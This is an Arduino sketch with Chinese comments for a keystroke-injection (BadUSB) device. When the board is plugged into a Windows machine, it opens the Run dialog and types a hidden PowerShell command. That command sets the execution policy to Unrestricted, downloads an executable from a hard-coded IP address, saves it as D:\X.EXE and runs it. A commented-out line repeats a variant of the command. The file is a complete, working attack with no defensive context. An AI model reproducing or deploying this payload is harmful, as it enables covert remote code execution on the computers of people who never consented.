void setup() {//初始化
  Keyboard.begin();//开始键盘通讯
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键
  delay(500);
  Keyboard.press('r');//r键
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("POWERSHELL -NOP -W HIDDEN -C sET-eXECUTIONpOLICY UNRESTRICTED -FORCE;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('http://47.98.151.104/999.html', 'D:\\X.EXE');START D:\\X.EXE");
  //Keyboard.println("(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('http://47.98.151.104/999.html', 'D:\\X.EXE');START D:\\X.EXE;EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯
}
void loop()//循环
{
}
